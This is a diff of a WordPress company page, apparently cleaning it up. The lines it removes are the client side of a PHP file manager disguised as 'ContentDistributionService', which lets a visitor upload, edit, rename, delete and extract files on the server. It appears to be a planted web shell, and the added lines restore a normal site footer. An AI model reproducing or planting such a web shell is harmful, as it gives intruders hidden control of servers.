-<button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Cancel</button>
-<button type="button" class="btn btn-primary" onclick="doRename()"><i class="bi bi-check-lg"></i> Rename</button>
-</div></div></div></div>
-
-<!-- Preview Modal -->
-<div class="modal fade" id="previewModal" tabindex="-1">
-<div class="modal-dialog modal-xl"><div class="modal-content">
-<div class="modal-header"><h5 class="modal-title" id="previewTitle"></h5>
-<button type="button" class="btn-close" data-bs-dismiss="modal"></button></div>
-<div class="modal-body" id="previewBody" style="min-height:200px"></div>
-<div class="modal-footer">
-<a id="previewDl" class="btn btn-outline-secondary" href="#" download><i class="bi bi-download"></i> Download</a>
-<button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
-</div></div></div></div>
-';
-
-        // ---- Scripts ----
-        echo '
-<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
-<script>
-var CSRF="' . $csrf . '";
-var GO="' . urlencode($go) . '";
-
-// Theme toggle
-var html=document.documentElement,themeBtn=document.getElementById("themeBtn"),themeI=themeBtn.querySelector("i");
-function setTheme(d){html.setAttribute("data-bs-theme",d?"dark":"light");themeI.className=d?"bi bi-sun-fill":"bi bi-moon-stars-fill";localStorage.setItem("rm_theme",d)}
-themeBtn.addEventListener("click",function(){setTheme(html.getAttribute("data-bs-theme")!=="dark")});
-if(localStorage.getItem("rm_theme")==="true"||(localStorage.getItem("rm_theme")===null&&window.matchMedia("(prefers-color-scheme:dark)").matches)){setTheme(true)}
-
-function qs(s){return document.querySelector(s)}
-function qsa(s){return Array.from(document.querySelectorAll(s))}
-function enc(s){return btoa(unescape(encodeURIComponent(s)))}
-
-function postJSON(data,cb){
-fetch("",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(data)})
-.then(function(r){return r.json()}).then(function(j){if(cb)cb(j);else location.reload()}).catch(function(){location.reload()})
-}
-
-// Checkboxes
-var selAll=qs("#selAll"),btnDel=qs("#btnDel"),btnZip=qs("#btnZip");
-function syncBtns(){var any=qsa(".ck-item").some(function(c){return c.checked});btnDel.disabled=!any;btnZip.disabled=!any}
-selAll.addEventListener("change",function(){qsa(".ck-item").forEach(function(c){c.checked=selAll.checked});syncBtns()});
-qsa(".ck-item").forEach(function(c){c.addEventListener("change",function(){if(!c.checked)selAll.checked=false;else if(qsa(".ck-item").every(function(x){return x.checked}))selAll.checked=true;syncBtns()})});
-
-function doBatch(t){
-var f=qs("#resForm");
-var h=document.createElement("input");h.type="hidden";
-if(t==="del"){if(!confirm("Delete selected?"))return;h.name="do_delete";h.value="1"}
-else{h.name="do_archive";h.value="1"}
-f.appendChild(h);f.submit();
-}
-
-function editFile(n){
-fetch("?go="+GO+"&view="+encodeURIComponent(n)).then(function(r){return r.text()}).then(function(t){
-qs("#editTitle").textContent=n;qs("#editNameH").value=n;qs("#codeEditor").value=t;
-new bootstrap.Modal(qs("#editModal")).show()})
-}
-
-function doSave(){
-var n=qs("#editNameH").value,c=qs("#codeEditor").value,btn=qs("#saveBtn");
-btn.disabled=true;btn.innerHTML=\'<i class="bi bi-hourglass"></i> Saving...\';
-postJSON({_csrf:CSRF,do_save:enc("1"),res_name:enc(n),res_body:enc(c)},function(){
-btn.disabled=false;btn.innerHTML=\'<i class="bi bi-save"></i> Save\';
-bootstrap.Modal.getInstance(qs("#editModal")).hide();location.reload()})
-}
-
-function renameFile(n){
-qs("#renameOld").value=n;qs("#renameNew").value=n;
-new bootstrap.Modal(qs("#renameModal")).show()
-}
-function doRename(){
-var o=qs("#renameOld").value,n=qs("#renameNew").value;
-if(!n)return;
-postJSON({_csrf:CSRF,do_rename:enc("1"),old_name:enc(o),new_name:enc(n)})
-}
-
-function extractFile(n){
-if(!confirm("Extract "+n+" here?"))return;
-postJSON({_csrf:CSRF,do_extract:enc("1"),archive_name:enc(n)})
-}
-
-function createItem(e,t){
-e.preventDefault();
-var data={_csrf:CSRF};
-if(t==="folder"){var v=qs("#newFolderName").value;if(!v)return false;data.new_folder=enc(v)}
-else{var v=qs("#newFileName").value;if(!v)return false;data.new_file=enc(v)}
-postJSON(data);return false;
-}
-
-function previewFile(n){
-var body=qs("#previewBody"),title=qs("#previewTitle"),dl=qs("#previewDl");
-body.innerHTML=\'<div class="text-center">Loading...</div>\';
-title.textContent=n;
-dl.href="?go="+GO+"&dl="+encodeURIComponent(n);
-var ext=n.split(".").pop().toLowerCase();
-var imgExts=["png","jpg","jpeg","gif","webp","bmp","svg","ico"];
-var audExts=["mp3","wav","ogg","flac"];
-var vidExts=["mp4","webm","mov"];
-if(imgExts.indexOf(ext)>=0){
-body.innerHTML=\'<img style="max-width:100%;height:auto;border-radius:8px" src="?go=\'+GO+\'&dl=\'+encodeURIComponent(n)+\'">\';
-}else if(audExts.indexOf(ext)>=0){
-body.innerHTML=\'<audio controls src="?go=\'+GO+\'&dl=\'+encodeURIComponent(n)+\'" style="width:100%"></audio>\';
-}else if(vidExts.indexOf(ext)>=0){
-body.innerHTML=\'<video controls style="max-width:100%;border-radius:8px" src="?go=\'+GO+\'&dl=\'+encodeURIComponent(n)+\'"></video>\';
-}else if(ext==="pdf"){
-body.innerHTML=\'<iframe src="?go=\'+GO+\'&dl=\'+encodeURIComponent(n)+\'" style="width:100%;height:80vh;border:none;border-radius:8px"></iframe>\';
-}else{
-fetch("?go="+GO+"&view="+encodeURIComponent(n)).then(function(r){return r.text()}).then(function(t){
-var chunk=t.length>20000?t.slice(0,20000)+"\\n\\n...truncated...":t;
-body.innerHTML=\'<pre style="white-space:pre-wrap;word-break:break-word;font-family:monospace;font-size:13px;padding:12px;background:var(--bg);border-radius:8px">\'+escHtml(chunk)+\'</pre>\'
-}).catch(function(){body.innerHTML=\'<div class="text-danger">Cannot preview.</div>\'})
-}
-new bootstrap.Modal(qs("#previewModal")).show()
-}
-function escHtml(s){return s.replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;")}
-
-// Upload engine
-var prog=qs("#progBar"),fill=qs("#progFill");
-function readAsB64(file){return new Promise(function(res){var r=new FileReader();r.onload=function(){res({name:file.name,data:r.result})};r.readAsDataURL(file)})}
-function uploadFiles(files){
-if(!files||files.length===0)return;
-prog.style.display="block";fill.style.width="10%";
-var p=[];
-for(var i=0;i<files.length;i++)p.push(readAsB64(files[i]));
-Promise.all(p).then(function(results){
-fill.style.width="50%";
-var payload={_csrf:CSRF,do_ajax_upload:enc("1"),files_payload:JSON.stringify(results)};
-fetch("",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(payload)})
-.then(function(r){return r.json()}).then(function(){prog.style.display="none";fill.style.width="0%";location.reload()})
-.catch(function(){prog.style.display="none";location.reload()})
-})}
-qs("#uploadBtn").addEventListener("click",function(){uploadFiles(qs("#fileInput").files)});
-var dz=qs("#dropZone"),_dc=0;
-dz.addEventListener("dragenter",function(ev){ev.preventDefault();_dc++;dz.classList.add("over")});
-dz.addEventListener("dragover",function(ev){ev.preventDefault()});
-dz.addEventListener("dragleave",function(){_dc--;if(_dc<=0){_dc=0;dz.classList.remove("over")}});
-dz.addEventListener("drop",function(ev){ev.preventDefault();ev.stopPropagation();_dc=0;dz.classList.remove("over");uploadFiles(ev.dataTransfer.files)});
-
-// Search hotkey
-document.addEventListener("keydown",function(e){if((e.ctrlKey||e.metaKey)&&e.key==="k"){e.preventDefault();var s=qs("input[name=search]");if(s)s.focus()}});
+	</div> <!-- ast-container -->
+	</div><!-- #content -->
+		<footer itemtype="https://schema.org/WPFooter" itemscope="itemscope" id="colophon" role="contentinfo">
+			<div class='footer-width-fixer'>		<div data-elementor-type="wp-post" data-elementor-id="1519" class="elementor elementor-1519">
+						<section class="elementor-section elementor-top-section elementor-element elementor-element-461abe66 elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="461abe66" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
+						<div class="elementor-container elementor-column-gap-no">
+					<div class="elementor-column elementor-col-50 elementor-top-column elementor-element elementor-element-2d4afeae" data-id="2d4afeae" data-element_type="column">
+			<div class="elementor-widget-wrap elementor-element-populated">
+						<div class="elementor-element elementor-element-6cc7e40c elementor-widget elementor-widget-text-editor" data-id="6cc7e40c" data-element_type="widget" data-widget_type="text-editor.default">
+				<div class="elementor-widget-container">
+							<img class="wp-image-1830 aligncenter" src="https://dgf.com.my/wp-content/uploads/2020/10/logo-01-1-300x128.png" alt="" width="345" height="147" />						</div>
+				</div>
+					</div>
+		</div>
+				<div class="elementor-column elementor-col-25 elementor-top-column elementor-element elementor-element-15b2b045" data-id="15b2b045" data-element_type="column">
+			<div class="elementor-widget-wrap elementor-element-populated">
+						<div class="elementor-element elementor-element-47696165 elementor-widget elementor-widget-heading" data-id="47696165" data-element_type="widget" data-widget_type="heading.default">
+				<div class="elementor-widget-container">
+			<h4 class="elementor-heading-title elementor-size-default">Contact Info</h4>		</div>
+				</div>
+				<div class="elementor-element elementor-element-65d3e385 elementor-widget-divider--view-line elementor-widget elementor-widget-divider" data-id="65d3e385" data-element_type="widget" data-widget_type="divider.default">
+				<div class="elementor-widget-container">
+					<div class="elementor-divider">
+			<span class="elementor-divider-separator">
+						</span>
+		</div>
+				</div>
+				</div>
+				<div class="elementor-element elementor-element-79f7f693 elementor-icon-list--layout-traditional elementor-list-item-link-full_width elementor-widget elementor-widget-icon-list" data-id="79f7f693" data-element_type="widget" data-widget_type="icon-list.default">
+				<div class="elementor-widget-container">
+					<ul class="elementor-icon-list-items">
+							<li class="elementor-icon-list-item">
+											<span class="elementor-icon-list-icon">
+							<i aria-hidden="true" class="fas fa-map-marker-alt"></i>						</span>
+										<span class="elementor-icon-list-text">WISMA DYNAMIC, No. 9, Jalan 15/48A, Sentul Boulevard Shop Office, Jalan Sentul, 51000 Kuala Lumpur.</span>
+									</li>
+								<li class="elementor-icon-list-item">
+											<span class="elementor-icon-list-icon">
+							<i aria-hidden="true" class="fas fa-envelope"></i>						</span>
+										<span class="elementor-icon-list-text">info@dgf.com.my</span>
+									</li>
+								<li class="elementor-icon-list-item">
+											<span class="elementor-icon-list-icon">
+							<i aria-hidden="true" class="fas fa-phone"></i>						</span>
+										<span class="elementor-icon-list-text">+603-4043 1786 / +603-4043 2786</span>
+									</li>
+								<li class="elementor-icon-list-item">
+											<span class="elementor-icon-list-icon">
+							<i aria-hidden="true" class="fas fa-fax"></i>						</span>
+										<span class="elementor-icon-list-text">+603-4043 3786</span>
+									</li>
+						</ul>
+				</div>
+				</div>
+					</div>
+		</div>
+				<div class="elementor-column elementor-col-25 elementor-top-column elementor-element elementor-element-6afc2859" data-id="6afc2859" data-element_type="column">
+			<div class="elementor-widget-wrap elementor-element-populated">
+						<div class="elementor-element elementor-element-56b726ee elementor-widget elementor-widget-heading" data-id="56b726ee" data-element_type="widget" data-widget_type="heading.default">
+				<div class="elementor-widget-container">
+			<h4 class="elementor-heading-title elementor-size-default">HOTLINE NO.:</h4>		</div>
+				</div>
+				<div class="elementor-element elementor-element-57abc0c0 elementor-widget-divider--view-line elementor-widget elementor-widget-divider" data-id="57abc0c0" data-element_type="widget" data-widget_type="divider.default">
+				<div class="elementor-widget-container">
+					<div class="elementor-divider">
+			<span class="elementor-divider-separator">
+						</span>
+		</div>
+				</div>
+				</div>
+				<div class="elementor-element elementor-element-b0b1b67 elementor-align-left elementor-mobile-align-left elementor-icon-list--layout-traditional elementor-list-item-link-full_width elementor-widget elementor-widget-icon-list" data-id="b0b1b67" data-element_type="widget" data-widget_type="icon-list.default">
+				<div class="elementor-widget-container">
+					<ul class="elementor-icon-list-items">
+							<li class="elementor-icon-list-item">
+											<span class="elementor-icon-list-icon">
+							<i aria-hidden="true" class="fas fa-phone"></i>						</span>
+										<span class="elementor-icon-list-text">+603-4051 2777</span>
+									</li>
+						</ul>
+				</div>
+				</div>
+					</div>
+		</div>
+					</div>
+		</section>
+				<section class="elementor-section elementor-top-section elementor-element elementor-element-49adc22f elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="49adc22f" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
+						<div class="elementor-container elementor-column-gap-no">
+					<div class="elementor-column elementor-col-100 elementor-top-column elementor-element elementor-element-2fae3a99" data-id="2fae3a99" data-element_type="column">
+			<div class="elementor-widget-wrap elementor-element-populated">
+						<div class="elementor-element elementor-element-3b3cfb5a elementor-widget elementor-widget-copyright" data-id="3b3cfb5a" data-element_type="widget" data-settings="{&quot;align_mobile&quot;:&quot;center&quot;,&quot;align&quot;:&quot;center&quot;}" data-widget_type="copyright.default">
+				<div class="elementor-widget-container">
+					<div class="hfe-copyright-wrapper">
+							<span>Copyright © 2026 DYNAMIC GUARDFORCE SDN. BHD.</span>
+					</div>
+				</div>
+				</div>
+					</div>
+		</div>
+					</div>
+		</section>
+				</div>
+		</div>		</footer>
+		</div><!-- #page -->
+<script type="speculationrules">
+{"prefetch":[{"source":"document","where":{"and":[{"href_matches":"/*"},{"not":{"href_matches":["/wp-*.php","/wp-admin/*","/wp-content/uploads/*","/wp-content/*","/wp-content/plugins/*","/wp-content/themes/astra/*","/*\\?(.+)"]}},{"not":{"selector_matches":"a[rel~=\"nofollow\"]"}},{"not":{"selector_matches":".no-prefetch, .no-prefetch a"}}]},"eagerness":"conservative"}]}
 </script>
-</body>
-</html>';
-    }
-}
-
-// Boot
-$_svc = new ContentDistributionService();
-$_svc->handle();
+			<script type='text/javascript'>
+				const lazyloadRunObserver = () => {
+					const lazyloadBackgrounds = document.querySelectorAll( `.e-con.e-parent:not(.e-lazyloaded)` );
+					const lazyloadBackgroundObserver = new IntersectionObserver( ( entries ) => {
+						entries.forEach( ( entry ) => {
+							if ( entry.isIntersecting ) {
+								let lazyloadBackground = entry.target;
+								if( lazyloadBackground ) {
+									lazyloadBackground.classList.add( 'e-lazyloaded' );
+								}
+								lazyloadBackgroundObserver.unobserve( entry.target );
+							}
+						});
+					}, { rootMargin: '200px 0px 200px 0px' } );
+					lazyloadBackgrounds.forEach( ( lazyloadBackground ) => {
+						lazyloadBackgroundObserver.observe( lazyloadBackground );
+					} );
+				};
+				const events = [
+					'DOMContentLoaded',
+					'elementor/lazyload/observe',
+				];
+				events.forEach( ( event ) => {
+					document.addEventListener( event, lazyloadRunObserver );
+				} );
+			</script>
+						<script>
+			/(trident|msie)/i.test(navigator.userAgent)&&document.getElementById&&window.addEventListener&&window.addEventListener("hashchange",function(){var t,e=location.hash.substring(1);/^[A-z0-9_-]+$/.test(e)&&(t=document.getElementById(e))&&(/^(?:a|select|input|button|textarea)$/i.test(t.tagName)||(t.tabIndex=-1),t.focus())},!1);
+			</script>
+			<script id="astra-theme-js-js-extra">
+var astra = {"break_point":"921","isRtl":"","is_scroll_to_id":"","is_scroll_to_top":""};
+//# sourceURL=astra-theme-js-js-extra
+</script>
+<script src="https://dgf.com.my/wp-content/themes/astra/assets/js/minified/style.min.js?ver=4.0.2" id="astra-theme-js-js"></script>
+<script src="https://dgf.com.my/wp-includes/js/dist/hooks.min.js?ver=dd5603f07f9220ed27f1" id="wp-hooks-js"></script>
+<script src="https://dgf.com.my/wp-includes/js/dist/i18n.min.js?ver=c26c3dc7bed366793375" id="wp-i18n-js"></script>
+<script id="wp-i18n-js-after">
+wp.i18n.setLocaleData( { 'text direction\u0004ltr': [ 'ltr' ] } );
+//# sourceURL=wp-i18n-js-after
+</script>
+<script src="https://dgf.com.my/wp-content/plugins/contact-form-7/includes/swv/js/index.js?ver=5.9.8" id="swv-js"></script>
+<script id="contact-form-7-js-extra">
+var wpcf7 = {"api":{"root":"https://dgf.com.my/wp-json/","namespace":"contact-form-7/v1"}};
+//# sourceURL=contact-form-7-js-extra
+</script>
+<script src="https://dgf.com.my/wp-content/plugins/contact-form-7/includes/js/index.js?ver=5.9.8" id="contact-form-7-js"></script>
+<script src="https://dgf.com.my/wp-content/plugins/devvn-image-hotspot/frontend/js/jquery.powertip.min.js?ver=1.2.0" id="powertip-js"></script>
+<script src="https://dgf.com.my/wp-content/plugins/devvn-image-hotspot/frontend/js/maps_points.js?ver=1.2.8" id="maps-points-js"></script>
+<script src="https://dgf.com.my/wp-includes/js/dist/dom-ready.min.js?ver=f77871ff7694fffea381" id="wp-dom-ready-js"></script>
+<script id="starter-templates-zip-preview-js-extra">
+var starter_templates_zip_preview = {"AstColorPaletteVarPrefix":"--ast-global-color-","AstEleColorPaletteVarPrefix":["ast-global-color-0","ast-global-color-1","ast-global-color-2","ast-global-color-3","ast-global-color-4","ast-global-color-5","ast-global-color-6","ast-global-color-7","ast-global-color-8"]};
+//# sourceURL=starter-templates-zip-preview-js-extra
+</script>
+<script src="https://dgf.com.my/wp-content/plugins/astra-sites/inc/lib/onboarding/assets/dist/template-preview/main.js?ver=06758d4d807d9d22c6ea" id="starter-templates-zip-preview-js"></script>
+<script src="https://dgf.com.my/wp-content/plugins/elementor/assets/js/webpack.runtime.min.js?ver=3.24.5" id="elementor-webpack-runtime-js"></script>
+<script src="https://dgf.com.my/wp-content/plugins/elementor/assets/js/frontend-modules.min.js?ver=3.24.5" id="elementor-frontend-modules-js"></script>
+<script src="https://dgf.com.my/wp-includes/js/jquery/ui/core.min.js?ver=1.13.3" id="jquery-ui-core-js"></script>
+<script id="elementor-frontend-js-before">
+var elementorFrontendConfig = {"environmentMode":{"edit":false,"wpPreview":false,"isScriptDebug":false},"i18n":{"shareOnFacebook":"Share on Facebook","shareOnTwitter":"Share on Twitter","pinIt":"Pin it","download":"Download","downloadImage":"Download image","fullscreen":"Fullscreen","zoom":"Zoom","share":"Share","playVideo":"Play Video","previous":"Previous","next":"Next","close":"Close","a11yCarouselWrapperAriaLabel":"Carousel | Horizontal scrolling: Arrow Left & Right","a11yCarouselPrevSlideMessage":"Previous slide","a11yCarouselNextSlideMessage":"Next slide","a11yCarouselFirstSlideMessage":"This is the first slide","a11yCarouselLastSlideMessage":"This is the last slide","a11yCarouselPaginationBulletMessage":"Go to slide"},"is_rtl":false,"breakpoints":{"xs":0,"sm":480,"md":768,"lg":1025,"xl":1440,"xxl":1600},"responsive":{"breakpoints":{"mobile":{"label":"Mobile Portrait","value":767,"default_value":767,"direction":"max","is_enabled":true},"mobile_extra":{"label":"Mobile Landscape","value":880,"default_value":880,"direction":"max","is_enabled":false},"tablet":{"label":"Tablet Portrait","value":1024,"default_value":1024,"direction":"max","is_enabled":true},"tablet_extra":{"label":"Tablet Landscape","value":1200,"default_value":1200,"direction":"max","is_enabled":false},"laptop":{"label":"Laptop","value":1366,"default_value":1366,"direction":"max","is_enabled":false},"widescreen":{"label":"Widescreen","value":2400,"default_value":2400,"direction":"min","is_enabled":false}},"hasCustomBreakpoints":false},"version":"3.24.5","is_static":false,"experimentalFeatures":{"additional_custom_breakpoints":true,"container_grid":true,"e_swiper_latest":true,"e_nested_atomic_repeaters":true,"e_onboarding":true,"home_screen":true,"ai-layout":true,"landing-pages":true,"link-in-bio":true,"floating-buttons":true},"urls":{"assets":"https:\/\/dgf.com.my\/wp-content\/plugins\/elementor\/assets\/","ajaxurl":"https:\/\/dgf.com.my\/wp-admin\/admin-ajax.php","uploadUrl":"https:\/\/dgf.com.my\/wp-content\/uploads"},"nonces":{"floatingButtonsClickTracking":"91a87ad94a"},"swiperClass":"swiper","settings":{"page":[],"editorPreferences":[]},"kit":{"active_breakpoints":["viewport_mobile","viewport_tablet"],"global_image_lightbox":"yes","lightbox_enable_counter":"yes","lightbox_enable_fullscreen":"yes","lightbox_enable_zoom":"yes","lightbox_enable_share":"yes","lightbox_title_src":"title","lightbox_description_src":"description"},"post":{"id":1733,"title":"Management%20team%20%E2%80%93%20DYNAMIC%20GUARDFORCE%20SDN.%20BHD.","excerpt":"","featuredImage":false}};
+//# sourceURL=elementor-frontend-js-before
+</script>
+<script src="https://dgf.com.my/wp-content/plugins/elementor/assets/js/frontend.min.js?ver=3.24.5" id="elementor-frontend-js"></script>
+<script id="wp-emoji-settings" type="application/json">
+{"baseUrl":"https://s.w.org/images/core/emoji/17.0.2/72x72/","ext":".png","svgUrl":"https://s.w.org/images/core/emoji/17.0.2/svg/","svgExt":".svg","source":{"concatemoji":"https://dgf.com.my/wp-includes/js/wp-emoji-release.min.js?ver=6.9.4"}}
+</script>
+<script type="module">
+/*! This file is auto-generated */
+const a=JSON.parse(document.getElementById("wp-emoji-settings").textContent),o=(window._wpemojiSettings=a,"wpEmojiSettingsSupports"),s=["flag","emoji"];function i(e){try{var t={supportTests:e,timestamp:(new Date).valueOf()};sessionStorage.setItem(o,JSON.stringify(t))}catch(e){}}function c(e,t,n){e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(t,0,0);t=new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data);e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(n,0,0);const a=new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data);return t.every((e,t)=>e===a[t])}function p(e,t){e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(t,0,0);var n=e.getImageData(16,16,1,1);for(let e=0;e<n.data.length;e++)if(0!==n.data[e])return!1;return!0}function u(e,t,n,a){switch(t){case"flag":return n(e,"\ud83c\udff3\ufe0f\u200d\u26a7\ufe0f","\ud83c\udff3\ufe0f\u200b\u26a7\ufe0f")?!1:!n(e,"\ud83c\udde8\ud83c\uddf6","\ud83c\udde8\u200b\ud83c\uddf6")&&!n(e,"\ud83c\udff4\udb40\udc67\udb40\udc62\udb40\udc65\udb40\udc6e\udb40\udc67\udb40\udc7f","\ud83c\udff4\u200b\udb40\udc67\u200b\udb40\udc62\u200b\udb40\udc65\u200b\udb40\udc6e\u200b\udb40\udc67\u200b\udb40\udc7f");case"emoji":return!a(e,"\ud83e\u1fac8")}return!1}function f(e,t,n,a){let r;const o=(r="undefined"!=typeof WorkerGlobalScope&&self instanceof WorkerGlobalScope?new OffscreenCanvas(300,150):document.createElement("canvas")).getContext("2d",{willReadFrequently:!0}),s=(o.textBaseline="top",o.font="600 32px Arial",{});return e.forEach(e=>{s[e]=t(o,e,n,a)}),s}function r(e){var t=document.createElement("script");t.src=e,t.defer=!0,document.head.appendChild(t)}a.supports={everything:!0,everythingExceptFlag:!0},new Promise(t=>{let n=function(){try{var e=JSON.parse(sessionStorage.getItem(o));if("object"==typeof e&&"number"==typeof e.timestamp&&(new Date).valueOf()<e.timestamp+604800&&"object"==typeof e.supportTests)return e.supportTests}catch(e){}return null}();if(!n){if("undefined"!=typeof Worker&&"undefined"!=typeof OffscreenCanvas&&"undefined"!=typeof URL&&URL.createObjectURL&&"undefined"!=typeof Blob)try{var e="postMessage("+f.toString()+"("+[JSON.stringify(s),u.toString(),c.toString(),p.toString()].join(",")+"));",a=new Blob([e],{type:"text/javascript"});const r=new Worker(URL.createObjectURL(a),{name:"wpTestEmojiSupports"});return void(r.onmessage=e=>{i(n=e.data),r.terminate(),t(n)})}catch(e){}i(n=f(s,u,c,p))}t(n)}).then(e=>{for(const n in e)a.supports[n]=e[n],a.supports.everything=a.supports.everything&&a.supports[n],"flag"!==n&&(a.supports.everythingExceptFlag=a.supports.everythingExceptFlag&&a.supports[n]);var t;a.supports.everythingExceptFlag=a.supports.everythingExceptFlag&&!a.supports.flag,a.supports.everything||((t=a.source||{}).concatemoji?r(t.concatemoji):t.wpemoji&&t.twemoji&&(r(t.twemoji),r(t.wpemoji)))});
+//# sourceURL=https://dgf.com.my/wp-includes/js/wp-emoji-loader.min.js
+</script>
+	</body>
+</html>
